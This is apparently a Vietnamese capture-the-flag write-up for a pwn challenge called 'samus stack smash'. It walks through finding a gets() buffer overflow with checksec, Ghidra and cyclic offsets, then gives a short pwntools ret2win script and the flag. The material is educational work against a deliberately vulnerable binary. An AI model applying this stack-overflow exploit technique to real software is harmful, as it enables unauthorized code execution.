Giải đấu: Riffhack

Tên bài: samus stack smash

Mảng: Pwn

Mô tả: A Federation checkpoint AI loops the same authorization prompt while a damaged Chozo console hums behind it. Push past the guard and see what the access vault is hiding.

Dạng flag: bitctf{...}

📂 Tài nguyên bài tập

Bạn có thể tải các file tại đây để thực hành:

File thực thi [(samus_stack_smash)](./samus_stack_smash)

Script khai thác [(script_samus_stack_smash.py)](./script_samus_stack_smash.py)

__1. PHÂN TÍCH FILE__

Trước hết cần phải kiểm tra xem file này có bật các cơ chế bảo mật không bằng lệnh _``checksec [ten_file]``__

<img width="767" height="300" alt="image" src="https://github.com/user-attachments/assets/19bbc51b-5a31-4182-9df0-621983c0e941" />

__-> Thật tuyệt, file này không có cơ chế bảo mật nào vì thế chúng ta có thể tấn công bằng nhiều hình thức khác nhau như ret2shellcode, ret2win,...__

__2. PHÂN TÍCH MÃ NGUỒN__

Ở bước này chúng ta cần ném file nhị phân mà đề cho vào Ghidra để có thể đọc và phân tích

__``HÀM MAIN``__

<img width="876" height="271" alt="image" src="https://github.com/user-attachments/assets/9ad46f4e-4695-43a0-8595-5d81b691acb3" />

Ở đây có thể thấy được rằng chương trình sẽ gọi hàm __``vuln()``__ để mà thực thi các lệnh trong đó -> Thực thi xong sẽ trả về thông báo __``Signal lost.``__ -> Kết thúc chương trình

__``HÀM VULN()``__

<img width="882" height="365" alt="image" src="https://github.com/user-attachments/assets/4d94f2df-866d-4c22-bb8e-1e839c51ecff" />

Đây sẽ là nơi mà thông báo chương trình sẽ xuất hiện ra khi ta chạy file này

Á à chúng ta đã bắt được 1 lỗi __``"Chết Người"``__ ở đây với đoạn code ``gets(local_28);``. Lệnh ``get()`` ở đây nhận và ghi giá trị đầu vào không có giới hạn mà trong khi đó chương trình chỉ khởi tạo cho mảng ``local_28`` với chỉ 32 bytes dẫn tới lỗ hổng ``Buffer Overflow`` 

Việc của chúng ta bây giờ chỉ cần kiểm tra xem trong file này hàm nào là hàm in và đọc flag -> Lấy địa chỉ hàm đó -> Flag

<img width="881" height="627" alt="image" src="https://github.com/user-attachments/assets/8c0457a5-a1e4-434c-bb3f-64a7d8b1b861" />

Như ảnh trên, hàm ``mission_clear()`` là hàm đảm nhiệm nhiệm vụ đó

__``KẾ HOẠCH TẤN CÔNG``__

* Tính offset từ chỗ input đến chỗ ``Return Adress`` -> chèn các byte rác để làm tràn và lấp đầy các vùng nhớ -> Trỏ địa chỉ hàm ``mission_clear()`` vào chỗ ``Return Adress`` -> Flag

__3. THỰC HIỆN KẾ HOẠCH__

Trước hết chúng ta cần phải tính offset bằng cách chạy file trong GDB Ubuntu -> dùng lệnh _``cyclic [so_luong_byte_rac]``_

<img width="1148" height="102" alt="image" src="https://github.com/user-attachments/assets/10ee1e8e-c3ca-48ad-a164-b7e3060d1e1a" />

Như bức ảnh trên, mình đã dùng _``cyclic 100``_ và nó trả về giá trị là ``<0x6161616c6161616b>``

<img width="977" height="93" alt="image" src="https://github.com/user-attachments/assets/4f83af67-db0b-4faf-9693-905845bf5a40" />

Mình chỉ cần dùng lệnh _``cyclic -l [ma_hex_tra_ve]``_ để tìm ra offset và mình ra ``offset = 40``

Bây giờ cũng trong GDB Ubuntu đó dùng lệnh _``p [ham_can_tim]``_ để tìm địa chỉ của hàm đó 

<img width="912" height="58" alt="image" src="https://github.com/user-attachments/assets/525bd01b-9e77-459c-85a7-deb8ab91fd55" />

Có offset, có địa chỉ của hàm chứa flag -> Việc của chúng ta bây giờ chỉ cần nạp payload và bắn thôiiii!!!!!

```python
from pwn import *

# Chạy file trên local
# p = process('./ten_file')
# Kết nối tới server
p = remote('host', port)
rop = ROP('./samus_stack_smash')
ret_gadget = rop.ret.address
# Dựng payload có chèn ret gadget để căn chỉnh stack (chống crash)
payload = b'A' * 40
payload += p64(ret_gadget)
payload += p64(0x401216)
p.sendlineafter(b'> ', payload)
p.interactive()

bitctf{{m37r01d_57ack_0v3rrun}}
```
